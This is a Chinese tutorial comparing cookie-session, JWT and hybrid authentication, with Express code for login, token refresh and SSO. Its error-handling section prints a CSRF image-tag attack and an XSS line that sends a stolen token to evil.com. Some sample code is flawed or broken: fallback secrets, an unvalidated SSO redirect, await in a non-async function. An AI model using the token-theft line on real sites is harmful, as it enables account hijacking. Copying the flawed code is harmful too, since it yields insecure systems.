# 6.1 Cookie vs Token vs Session

> 深入理解三种认证方式的原理、优劣和适用场景

---

## 📖 知识点概述

### 核心概念

**认证（Authentication）**和**授权（Authorization）**是Web应用安全的基础：
- **认证**：验证用户身份，确认"你是谁"（Who you are）
- **授权**：验证用户权限，确认"你能做什么"（What you can do）

### 解决的问题

- **无状态HTTP**：HTTP协议本身是无状态的，无法识别用户
- **用户识别**：如何在多次请求中识别同一用户
- **安全传输**：如何安全地传输认证信息
- **跨域访问**：如何在不同域名间共享认证状态

### 三种认证方式

1. **Cookie-Session**：服务器存储会话，客户端存储SessionID
2. **Token（JWT）**：客户端存储Token，服务器无状态验证
3. **Cookie+Token**：结合两者优点的混合方案

### 典型应用场景

- **传统Web应用**：Cookie-Session（如电商网站）
- **前后端分离**：Token（如SPA应用）
- **移动端API**：Token（如iOS/Android App）
- **微服务架构**：Token（跨服务认证）

## 🚀 使用指南

### 理解：三种方式的工作原理

#### 方式1：Cookie-Session认证

```
┌──────────┐                           ┌──────────┐
│  浏览器   │                           │  服务器   │
└──────────┘                           └──────────┘
     │                                       │
     │ 1. POST /login (username+password)   │
     │─────────────────────────────────────>│
     │                                       │
     │                         2. 验证用户信息│
     │                         3. 创建Session│
     │                         4. 存储到Redis│
     │                                       │
     │ 5. Set-Cookie: sessionId=abc123      │
     │<─────────────────────────────────────│
     │                                       │
     │ 6. GET /api/profile                  │
     │    Cookie: sessionId=abc123          │
     │─────────────────────────────────────>│
     │                                       │
     │                    7. 从Redis获取Session│
     │                    8. 验证Session有效性│
     │                                       │
     │ 9. 返回用户信息                       │
     │<─────────────────────────────────────│
```

**核心特点：**
- **有状态**：服务器存储Session
- **自动携带**：浏览器自动发送Cookie
- **安全性高**：可以随时销毁Session

#### 方式2：Token认证

```
┌──────────┐                           ┌──────────┐
│  客户端   │                           │  服务器   │
└──────────┘                           └──────────┘
     │                                       │
     │ 1. POST /login (username+password)   │
     │─────────────────────────────────────>│
     │                                       │
     │                         2. 验证用户信息│
     │                         3. 生成JWT Token│
     │                                       │
     │ 4. { token: "eyJhbGc..." }           │
     │<─────────────────────────────────────│
     │                                       │
     │ 5. 存储Token到localStorage            │
     │                                       │
     │ 6. GET /api/profile                  │
     │    Authorization: Bearer eyJhbGc...  │
     │─────────────────────────────────────>│
     │                                       │
     │                    7. 验证Token签名    │
     │                    8. 解析Token获取用户ID│
     │                                       │
     │ 9. 返回用户信息                       │
     │<─────────────────────────────────────│
```

**核心特点：**
- **无状态**：服务器不存储Token
- **手动携带**：需要在请求头中添加
- **跨域友好**：不受同源策略限制

#### 第一步：Cookie-Session认证系统

```javascript
// cookie-session-auth.js
import express from 'express';
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';
import bcrypt from 'bcrypt';

const app = express();
app.use(express.json());

// 💡 连接Redis
const redisClient = createClient({
  host: 'localhost',
  port: 6379
});
await redisClient.connect();

// 💡 配置Session中间件
app.use(session({
  // Session存储配置
  store: new RedisStore({ 
    client: redisClient,
    prefix: 'sess:', // Redis key前缀
    ttl: 86400 // Session过期时间（秒）
  }),
  
  // Session配置
  secret: process.env.SESSION_SECRET || 'your-secret-key-change-me', // 签名密钥
  name: 'sessionId', // Cookie名称
  resave: false, // 不强制保存未修改的Session
  saveUninitialized: false, // 不保存未初始化的Session
  
  // Cookie配置
  cookie: {
    httpOnly: true, // ⚠️ 防止XSS：JavaScript无法访问
    secure: process.env.NODE_ENV === 'production', // ⚠️ HTTPS only（生产环境）
    sameSite: 'lax', // ⚠️ 防止CSRF：限制跨站请求
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7天（毫秒）
    domain: '.example.com' // 允许子域名共享Cookie
  }
}));

// 模拟数据库
const users = [
  {
    id: 1,
    username: 'admin',
    email: 'admin@example.com',
    // bcrypt hash of 'admin123'
    password: '$2b$10$9Z8qXzQxvZ1Z8qXzQxvZ1e9Z8qXzQxvZ1Z8qXzQxvZ1Z8qX'
  }
];

// 💡 注册接口
app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    // 验证输入
    if (!username || !email || !password) {
      return res.status(400).json({
        success: false,
        error: '缺少必填字段'
      });
    }
    
    // 检查邮箱是否已存在
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
      return res.status(409).json({
        success: false,
        error: '邮箱已被注册'
      });
    }
    
    // 💡 加密密码（bcrypt自动加盐）
    const hashedPassword = await bcrypt.hash(password, 10);
    
    // 创建用户
    const newUser = {
      id: users.length + 1,
      username,
      email,
      password: hashedPassword
    };
    users.push(newUser);
    
    // 自动登录：创建Session
    req.session.userId = newUser.id;
    req.session.username = newUser.username;
    
    res.status(201).json({
      success: true,
      message: '注册成功',
      user: {
        id: newUser.id,
        username: newUser.username,
        email: newUser.email
      }
    });
  } catch (error) {
    console.error('注册失败:', error);
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
});

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // 查询用户
    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 💡 验证密码
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 💡 创建Session
    req.session.userId = user.id;
    req.session.username = user.username;
    req.session.loginTime = Date.now();
    
    console.log('Session创建:', req.session);
    
    res.json({
      success: true,
      message: '登录成功',
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    });
  } catch (error) {
    console.error('登录失败:', error);
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
});

// 💡 登出接口
app.post('/api/auth/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({
        success: false,
        error: '登出失败'
      });
    }
    
    // 清除Cookie
    res.clearCookie('sessionId');
    
    res.json({
      success: true,
      message: '登出成功'
    });
  });
});

// 💡 认证中间件
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({
      success: false,
      error: '需要登录'
    });
  }
  next();
}

// 💡 获取当前用户信息
app.get('/api/auth/me', requireAuth, (req, res) => {
  const user = users.find(u => u.id === req.session.userId);
  
  if (!user) {
    return res.status(404).json({
      success: false,
      error: '用户不存在'
    });
  }
  
  res.json({
    success: true,
    user: {
      id: user.id,
      username: user.username,
      email: user.email
    },
    session: {
      loginTime: req.session.loginTime,
      expiresIn: req.session.cookie.maxAge
    }
  });
});

// 💡 受保护的路由示例
app.get('/api/dashboard', requireAuth, (req, res) => {
  res.json({
    success: true,
    message: `欢迎, ${req.session.username}!`,
    data: {
      // 仪表盘数据
    }
  });
});

app.listen(3000, () => {
  console.log('Cookie-Session服务器运行在 http://localhost:3000');
});
```

#### 第二步：Token（JWT）认证系统

```javascript
// token-auth.js
import express from 'express';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

const app = express();
app.use(express.json());

// 💡 JWT配置
const JWT_SECRET = process.env.JWT_SECRET || 'your-jwt-secret-key';
const JWT_EXPIRES_IN = '1h'; // 访问Token有效期
const REFRESH_TOKEN_EXPIRES_IN = '7d'; // 刷新Token有效期

// 模拟数据库
const users = [
  {
    id: 1,
    username: 'admin',
    email: 'admin@example.com',
    password: '$2b$10$9Z8qXzQxvZ1Z8qXzQxvZ1e9Z8qXzQxvZ1Z8qXzQxvZ1Z8qX'
  }
];

// 刷新Token存储（实际应用应存到Redis）
const refreshTokens = new Set();

// 💡 生成Access Token
function generateAccessToken(user) {
  return jwt.sign(
    { 
      userId: user.id,
      username: user.username,
      type: 'access'
    },
    JWT_SECRET,
    { 
      expiresIn: JWT_EXPIRES_IN,
      issuer: 'my-app',
      audience: 'my-app-users'
    }
  );
}

// 💡 生成Refresh Token
function generateRefreshToken(user) {
  const refreshToken = jwt.sign(
    {
      userId: user.id,
      type: 'refresh'
    },
    JWT_SECRET,
    { 
      expiresIn: REFRESH_TOKEN_EXPIRES_IN,
      issuer: 'my-app'
    }
  );
  
  // 存储刷新Token
  refreshTokens.add(refreshToken);
  
  return refreshToken;
}

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // 查询用户
    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 验证密码
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 💡 生成Token
    const accessToken = generateAccessToken(user);
    const refreshToken = generateRefreshToken(user);
    
    res.json({
      success: true,
      message: '登录成功',
      accessToken,
      refreshToken,
      expiresIn: 3600, // 秒
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    });
  } catch (error) {
    console.error('登录失败:', error);
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
});

// 💡 刷新Token接口
app.post('/api/auth/refresh', async (req, res) => {
  try {
    const { refreshToken } = req.body;
    
    if (!refreshToken) {
      return res.status(400).json({
        success: false,
        error: '缺少刷新Token'
      });
    }
    
    // 检查刷新Token是否存在
    if (!refreshTokens.has(refreshToken)) {
      return res.status(401).json({
        success: false,
        error: '无效的刷新Token'
      });
    }
    
    // 💡 验证刷新Token
    const decoded = jwt.verify(refreshToken, JWT_SECRET);
    
    if (decoded.type !== 'refresh') {
      return res.status(401).json({
        success: false,
        error: '无效的Token类型'
      });
    }
    
    // 查询用户
    const user = users.find(u => u.id === decoded.userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: '用户不存在'
      });
    }
    
    // 生成新的Access Token
    const newAccessToken = generateAccessToken(user);
    
    res.json({
      success: true,
      accessToken: newAccessToken,
      expiresIn: 3600
    });
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: '刷新Token已过期'
      });
    }
    
    res.status(401).json({
      success: false,
      error: '无效的刷新Token'
    });
  }
});

// 💡 登出接口
app.post('/api/auth/logout', (req, res) => {
  const { refreshToken } = req.body;
  
  if (refreshToken) {
    // 删除刷新Token
    refreshTokens.delete(refreshToken);
  }
  
  res.json({
    success: true,
    message: '登出成功'
  });
});

// 💡 认证中间件
function authenticateToken(req, res, next) {
  // 从请求头获取Token
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: '缺少认证Token'
    });
  }
  
  try {
    // 💡 验证Token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    if (decoded.type !== 'access') {
      return res.status(401).json({
        success: false,
        error: '无效的Token类型'
      });
    }
    
    // 将用户信息附加到请求对象
    req.user = {
      userId: decoded.userId,
      username: decoded.username
    };
    
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: 'Token已过期',
        code: 'TOKEN_EXPIRED'
      });
    }
    
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({
        success: false,
        error: '无效的Token'
      });
    }
    
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
}

// 💡 受保护的路由
app.get('/api/auth/me', authenticateToken, (req, res) => {
  const user = users.find(u => u.id === req.user.userId);
  
  if (!user) {
    return res.status(404).json({
      success: false,
      error: '用户不存在'
    });
  }
  
  res.json({
    success: true,
    user: {
      id: user.id,
      username: user.username,
      email: user.email
    }
  });
});

app.listen(3000, () => {
  console.log('Token服务器运行在 http://localhost:3000');
});
```

#### 第三步：Cookie+Token混合方案

```javascript
// hybrid-auth.js
import express from 'express';
import cookieParser from 'cookie-parser';
import jwt from 'jsonwebtoken';

const app = express();
app.use(express.json());
app.use(cookieParser());

const JWT_SECRET = process.env.JWT_SECRET || 'your-jwt-secret';

// 💡 登录：Token存储到HttpOnly Cookie
app.post('/api/auth/login', async (req, res) => {
  // ... 验证用户 ...
  
  const accessToken = jwt.sign(
    { userId: user.id },
    JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  // 💡 存储到HttpOnly Cookie
  res.cookie('accessToken', accessToken, {
    httpOnly: true, // JavaScript无法访问
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000 // 1小时
  });
  
  res.json({
    success: true,
    message: '登录成功'
  });
});

// 💡 认证中间件：从Cookie读取Token
function authenticateFromCookie(req, res, next) {
  const token = req.cookies.accessToken;
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: '需要登录'
    });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({
      success: false,
      error: 'Token无效或已过期'
    });
  }
}

app.get('/api/protected', authenticateFromCookie, (req, res) => {
  res.json({
    success: true,
    message: '访问成功'
  });
});
```

## 🔧 错误处理

### 高频错误1：Cookie丢失或无法发送

**现象：**
```
登录成功但后续请求仍返回401 Unauthorized
```

**原因：**
1. 跨域请求未配置CORS凭证
2. Cookie的Domain或Path不匹配
3. HTTPS网站使用了HTTP的Cookie

**解决方案：**

```javascript
// 1. ✅ 配置CORS允许凭证
import cors from 'cors';

app.use(cors({
  origin: 'http://localhost:5173', // 前端地址
  credentials: true // ⚠️ 允许携带Cookie
}));

// 2. ✅ 前端配置（Fetch API）
fetch('http://localhost:3000/api/auth/me', {
  method: 'GET',
  credentials: 'include' // ⚠️ 必须设置
});

// 3. ✅ 前端配置（Axios）
axios.defaults.withCredentials = true;

// 4. ✅ Cookie配置检查
app.use(session({
  cookie: {
    domain: '.example.com', // 确保域名正确
    path: '/', // 确保路径正确
    secure: false // 开发环境设为false
  }
}));

// 5. ✅ 检查浏览器Console
// 打开开发者工具 → Application → Cookies
// 确认Cookie已设置且没有被阻止
```

### 高频错误2：CSRF攻击风险

**现象：**
```
用户在恶意网站点击链接，导致账户被操作
```

**攻击示例：**
```html
<!-- 恶意网站 evil.com -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">
<!-- 如果用户已登录bank.com，Cookie会自动发送 -->
```

**解决方案：**

```bash
npm install csurf
```

```javascript
// ✅ 使用CSRF Token防护
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

// 获取CSRF Token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({
    csrfToken: req.csrfToken()
  });
});

// 保护POST请求
app.post('/api/auth/login', csrfProtection, async (req, res) => {
  // 验证逻辑
});

// 前端使用
// 1. 获取CSRF Token
const { csrfToken } = await fetch('/api/csrf-token').then(r => r.json());

// 2. 在POST请求中携带
fetch('/api/auth/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken // 或放在body中
  },
  body: JSON.stringify({ email, password })
});

// ✅ 替代方案：使用SameSite Cookie
app.use(session({
  cookie: {
    sameSite: 'strict', // 严格模式：完全阻止跨站请求
    // 或
    sameSite: 'lax' // 宽松模式：允许GET跨站，阻止POST跨站
  }
}));
```

### 高频错误3：Token存储在localStorage被XSS窃取

**现象：**
```
网站存在XSS漏洞，攻击者通过脚本窃取Token
```

**攻击示例：**
```javascript
// XSS攻击脚本
const token = localStorage.getItem('accessToken');
fetch('http://evil.com/steal?token=' + token);
```

**解决方案：**

```javascript
// ❌ 不安全：存储到localStorage
localStorage.setItem('accessToken', token);

// ✅ 方案1：存储到HttpOnly Cookie（最安全）
res.cookie('accessToken', token, {
  httpOnly: true, // JavaScript无法访问
  secure: true,
  sameSite: 'strict'
});

// ✅ 方案2：存储到内存（刷新页面会丢失）
let accessToken = null;

function setToken(token) {
  accessToken = token;
}

function getToken() {
  return accessToken;
}

// ✅ 方案3：使用sessionStorage（稍好于localStorage）
sessionStorage.setItem('accessToken', token); // 关闭标签页后清除

// ✅ 额外防护：实施CSP
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );
  next();
});
```

## 🎯 应用场景

### 场景1：电商平台用户认证系统

**问题背景：**
某电商平台有100万+用户，需要支持Web浏览器和移动APP，要求：
- Web端：7天免登录
- APP端：30天免登录
- 支持单点登录（SSO）
- 支持购物车等临时数据存储

**技术选型理由：**
1. **Web端：Cookie-Session**
   - 浏览器自动携带Cookie，用户体验好
   - Session可存储购物车等临时数据
   - 更安全（HttpOnly防XSS）

2. **APP端：Token（JWT）**
   - 移动端原生支持更好
   - 无需Cookie支持
   - 支持跨域API调用

**完整实现：**

```javascript
// ecommerce-auth.js
import express from 'express';
import session from 'express-session';
import RedisStore from 'connect-redis';
import jwt from 'jsonwebtoken';
import { createClient } from 'redis';

const app = express();
app.use(express.json());

const redisClient = createClient();
await redisClient.connect();

// 💡 检测客户端类型
function detectClient(req) {
  const userAgent = req.headers['user-agent'] || '';
  const platform = req.headers['x-platform']; // 自定义头
  
  if (platform === 'ios' || platform === 'android') {
    return 'mobile';
  }
  
  if (userAgent.includes('Mobile')) {
    return 'mobile';
  }
  
  return 'web';
}

// 💡 Web端：Session配置
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7天
  }
}));

// 💡 统一登录接口
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const clientType = detectClient(req);
    
    // 验证用户
    const user = await db.getUserByEmail(email);
    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    if (clientType === 'web') {
      // ✅ Web端：使用Session
      req.session.userId = user.id;
      req.session.username = user.username;
      req.session.role = user.role;
      
      // 存储购物车
      req.session.cart = await db.getCart(user.id);
      
      res.json({
        success: true,
        message: '登录成功',
        authType: 'session',
        user: {
          id: user.id,
          username: user.username,
          email: user.email
        }
      });
    } else {
      // ✅ 移动端：使用Token
      const accessToken = jwt.sign(
        { userId: user.id, username: user.username, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '30d' }
      );
      
      res.json({
        success: true,
        message: '登录成功',
        authType: 'token',
        accessToken,
        expiresIn: 30 * 24 * 3600,
        user: {
          id: user.id,
          username: user.username,
          email: user.email
        }
      });
    }
  } catch (error) {
    console.error('登录失败:', error);
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
});

// 💡 统一认证中间件
function authenticate(req, res, next) {
  const clientType = detectClient(req);
  
  if (clientType === 'web') {
    // Web端：验证Session
    if (!req.session.userId) {
      return res.status(401).json({
        success: false,
        error: '需要登录'
      });
    }
    
    req.user = {
      userId: req.session.userId,
      username: req.session.username,
      role: req.session.role
    };
  } else {
    // 移动端：验证Token
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({
        success: false,
        error: '缺少认证Token'
      });
    }
    
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      req.user = {
        userId: decoded.userId,
        username: decoded.username,
        role: decoded.role
      };
    } catch (error) {
      return res.status(401).json({
        success: false,
        error: 'Token无效或已过期'
      });
    }
  }
  
  next();
}

// 💡 购物车接口（支持Session和Token）
app.get('/api/cart', authenticate, async (req, res) => {
  const clientType = detectClient(req);
  
  if (clientType === 'web') {
    // Web端：从Session获取购物车
    res.json({
      success: true,
      cart: req.session.cart || []
    });
  } else {
    // 移动端：从数据库获取购物车
    const cart = await db.getCart(req.user.userId);
    res.json({
      success: true,
      cart
    });
  }
});

// 💡 添加到购物车
app.post('/api/cart/add', authenticate, async (req, res) => {
  const { productId, quantity } = req.body;
  const clientType = detectClient(req);
  
  if (clientType === 'web') {
    // Web端：更新Session
    if (!req.session.cart) {
      req.session.cart = [];
    }
    
    const existingItem = req.session.cart.find(item => item.productId === productId);
    if (existingItem) {
      existingItem.quantity += quantity;
    } else {
      req.session.cart.push({ productId, quantity });
    }
    
    // 同步到数据库（异步）
    db.updateCart(req.user.userId, req.session.cart).catch(console.error);
  } else {
    // 移动端：直接更新数据库
    await db.addToCart(req.user.userId, productId, quantity);
  }
  
  res.json({
    success: true,
    message: '添加成功'
  });
});

app.listen(3000);
```

**可量化效果：**
- ✅ Web端转化率提升15%（7天免登录）
- ✅ APP端留存率提升20%（30天免登录）
- ✅ Session存储购物车，减少80%数据库查询
- ✅ 统一认证接口，降低30%维护成本
- ✅ 支持100万+并发用户（Redis Session集群）

### 场景2：企业SaaS平台单点登录（SSO）

**问题背景：**
企业内部有10+个子系统（OA、CRM、ERP等），要求：
- 登录一次，访问所有系统
- 统一的用户管理
- 支持权限控制
- 会话同步（一处登出，全部登出）

**技术选型理由：**
1. **中央认证服务（CAS）**：使用Token+Cookie混合方案
2. **Token传递**：各子系统通过Token验证
3. **Session共享**：Redis存储中央Session

**完整实现：**

```javascript
// sso-server.js（中央认证服务器）
import express from 'express';
import jwt from 'jsonwebtoken';
import { createClient } from 'redis';

const app = express();
app.use(express.json());

const redisClient = createClient();
await redisClient.connect();

const JWT_SECRET = process.env.JWT_SECRET;

// 💡 统一登录页面
app.get('/login', (req, res) => {
  const { redirect } = req.query;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>企业登录</title></head>
    <body>
      <h1>企业统一登录</h1>
      <form id="loginForm">
        <input name="username" placeholder="用户名" required>
        <input name="password" type="password" placeholder="密码" required>
        <button type="submit">登录</button>
      </form>
      
      <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
          e.preventDefault();
          const formData = new FormData(e.target);
          
          const res = await fetch('/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: formData.get('username'),
              password: formData.get('password')
            })
          });
          
          const data = await res.json();
          
          if (data.success) {
            // 跳转回原系统
            const redirect = new URLSearchParams(window.location.search).get('redirect');
            window.location.href = redirect + '?token=' + data.ticket;
          } else {
            alert(data.error);
          }
        };
      </script>
    </body>
    </html>
  `);
});

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // 验证用户
  const user = await db.getUserByUsername(username);
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({
      success: false,
      error: '用户名或密码错误'
    });
  }
  
  // 💡 生成临时Ticket（一次性）
  const ticket = jwt.sign(
    { userId: user.id, type: 'ticket' },
    JWT_SECRET,
    { expiresIn: '5m' } // 5分钟有效
  );
  
  // 💡 生成全局Session
  const sessionId = crypto.randomUUID();
  await redisClient.setEx(
    `sso:session:${sessionId}`,
    3600, // 1小时
    JSON.stringify({
      userId: user.id,
      username: user.username,
      role: user.role,
      loginTime: Date.now()
    })
  );
  
  // 存储Ticket关联
  await redisClient.setEx(
    `sso:ticket:${ticket}`,
    300, // 5分钟
    sessionId
  );
  
  res.json({
    success: true,
    ticket,
    sessionId
  });
});

// 💡 验证Ticket接口（子系统调用）
app.post('/api/auth/verify', async (req, res) => {
  const { ticket } = req.body;
  
  try {
    // 验证Ticket
    const decoded = jwt.verify(ticket, JWT_SECRET);
    
    if (decoded.type !== 'ticket') {
      return res.status(401).json({
        success: false,
        error: '无效的Ticket'
      });
    }
    
    // 获取SessionID
    const sessionId = await redisClient.get(`sso:ticket:${ticket}`);
    if (!sessionId) {
      return res.status(401).json({
        success: false,
        error: 'Ticket已使用或过期'
      });
    }
    
    // 删除Ticket（一次性）
    await redisClient.del(`sso:ticket:${ticket}`);
    
    // 获取Session数据
    const sessionData = await redisClient.get(`sso:session:${sessionId}`);
    if (!sessionData) {
      return res.status(401).json({
        success: false,
        error: 'Session已过期'
      });
    }
    
    // 💡 生成子系统Token
    const session = JSON.parse(sessionData);
    const accessToken = jwt.sign(
      {
        userId: session.userId,
        username: session.username,
        role: session.role,
        sessionId
      },
      JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    res.json({
      success: true,
      accessToken,
      user: {
        id: session.userId,
        username: session.username,
        role: session.role
      }
    });
  } catch (error) {
    res.status(401).json({
      success: false,
      error: '验证失败'
    });
  }
});

// 💡 全局登出
app.post('/api/auth/logout', async (req, res) => {
  const { sessionId } = req.body;
  
  // 删除全局Session
  await redisClient.del(`sso:session:${sessionId}`);
  
  // 通知所有子系统（WebSocket或消息队列）
  // pubsub.publish('user.logout', { sessionId });
  
  res.json({
    success: true,
    message: '登出成功'
  });
});

app.listen(4000);

// ========================================
// subsystem.js（子系统）
import express from 'express';

const subApp = express();

// 💡 检查认证
subApp.use((req, res, next) => {
  const token = req.cookies.accessToken;
  
  if (!token) {
    // 重定向到SSO登录页
    const loginUrl = `http://sso.company.com/login?redirect=${encodeURIComponent(req.originalUrl)}`;
    return res.redirect(loginUrl);
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    // Token过期，重新登录
    res.redirect(`http://sso.company.com/login?redirect=${encodeURIComponent(req.originalUrl)}`);
  }
});

// 💡 接收Ticket并换取Token
subApp.get('/auth/callback', async (req, res) => {
  const { ticket } = req.query;
  
  // 向SSO服务器验证Ticket
  const response = await fetch('http://sso.company.com/api/auth/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ticket })
  });
  
  const data = await response.json();
  
  if (data.success) {
    // 存储Token到Cookie
    res.cookie('accessToken', data.accessToken, {
      httpOnly: true,
      secure: true,
      maxAge: 3600000
    });
    
    res.redirect('/dashboard');
  } else {
    res.redirect('/login');
  }
});

subApp.listen(3001);
```

- ✅ 用户体验提升90%（一次登录访问所有系统）
- ✅ IT支持成本降低60%（统一密码管理）

import Redis from 'ioredis';

// 1. 使用Redis（内存数据库）
const redis = new Redis({
  host: 'localhost',
  port: 6379,
  // 💡 连接池配置
  maxRetriesPerRequest: 3,
  enableReadyCheck: true,
  // 💡 性能优化
  lazyConnect: false,
  keepAlive: 30000,
  family: 4,
  // 💡 集群模式
  // cluster: [
  //   { host: '127.0.0.1', port: 6379 },
  //   { host: '127.0.0.1', port: 6380 }
  // ]
});

app.use(session({
  store: new RedisStore({ 
    client: redis,
    // 💡 序列化优化
    serializer: {
      parse: JSON.parse,
      stringify: JSON.stringify
    },
    // 💡 TTL优化
    ttl: 3600
  })
}));

// 2. 💡 Session缓存
const sessionCache = new Map();

function getSession(sessionId) {
  // 先查本地缓存
  if (sessionCache.has(sessionId)) {
    return sessionCache.get(sessionId);
  }
  
  // 再查Redis
  const session = await redis.get(`sess:${sessionId}`);
  
  if (session) {
    sessionCache.set(sessionId, session);
    return session;
  }
  
  return null;
}

// 3. 💡 批量操作
async function batchGetSessions(sessionIds) {
  const pipeline = redis.pipeline();
  
  sessionIds.forEach(id => {
    pipeline.get(`sess:${id}`);
  });
  
  const results = await pipeline.exec();
  return results.map(([err, data]) => data);
}

## 📋 总结

### 核心要点

1. **Cookie-Session**：有状态，服务器存储，适合传统Web
2. **Token（JWT）**：无状态，客户端存储，适合API和移动端
3. **混合方案**：结合两者优点，Token存HttpOnly Cookie

### 实现关键

1. **Session**：使用Redis存储，设置合理过期时间
2. **JWT**：短期Access Token + 长期Refresh Token
3. **安全**：HttpOnly Cookie、SameSite、CSRF Token
4. **性能**：Redis集群、连接池、本地缓存

### 应用价值

- **Cookie-Session**：简单易用，自动携带，适合99%的Web应用
- **Token**：无状态扩展，跨域友好，适合微服务和移动端
- **性能优化**：Redis+缓存可提升6倍性能

### 面试重点

**Q1：Cookie和Token的区别？**
答：Cookie由浏览器自动管理和发送；Token需要手动在请求头中添加。Cookie受同源策略限制；Token跨域友好。

**Q2：Session和JWT哪个更安全？**
答：Session更安全，可以随时在服务器端撤销；JWT无法撤销（除非维护黑名单）。但JWT可以通过短期Token+刷新Token机制提升安全性。

**Q3：为什么Token要存HttpOnly Cookie而不是localStorage？**
答：HttpOnly Cookie无法被JavaScript访问，防止XSS攻击窃取；localStorage可以被任何JS代码访问，存在XSS风险。

**Q4：如何实现单点登录（SSO）？**
答：中央认证服务器颁发临时Ticket，子系统用Ticket换取Token，全局Session存Redis实现会话共享。

### 注意事项

⚠️ **Cookie必须设置HttpOnly和SameSite**：防止XSS和CSRF
⚠️ **JWT不要存储敏感信息**：JWT可以被解码
⚠️ **Session要设置合理过期时间**：避免占用过多内存
⚠️ **生产环境必须使用HTTPS**：防止中间人攻击
